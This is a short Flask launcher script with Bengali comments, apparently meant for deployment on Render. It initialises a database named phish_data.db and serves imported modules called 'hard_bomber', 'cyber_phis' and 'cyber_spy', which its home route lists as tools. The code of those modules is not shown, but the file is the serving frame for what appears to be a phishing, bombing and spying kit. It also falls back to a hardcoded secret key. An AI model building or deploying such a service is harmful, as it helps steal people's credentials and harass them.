from flask import Flask
import importlib
import os
from cyber_phis import init_db   # ✅ ডেটাবেস তৈরির ফাংশন ইমপোর্ট

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'fallback-secret-key-2026')   # ✅ সেশন সাপোর্টের জন্য

# ========== ডেটাবেস তৈরি করো ==========
init_db()   # ✅ /tmp/phish_data.db তৈরি হবে

# ========== ব্লুপ্রিন্ট লোড ==========
files = ['hard_bomber', 'cyber_phis', 'cyber_spy', 'support']
for file in files:
    module = importlib.import_module(file)
    if hasattr(module, 'bp'):
        app.register_blueprint(module.bp)

# ========== হোম ও পিং ==========
@app.route('/')
def home():
    return {'status': 'online', 'tools': ['/hard_bomber', '/phis', '/spy', '/support']}

@app.route('/ping')
def ping():
    from datetime import datetime
    return {'status': 'ok', 'timestamp': datetime.now().isoformat()}

# ========== Render-এর জন্য পোর্ট ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
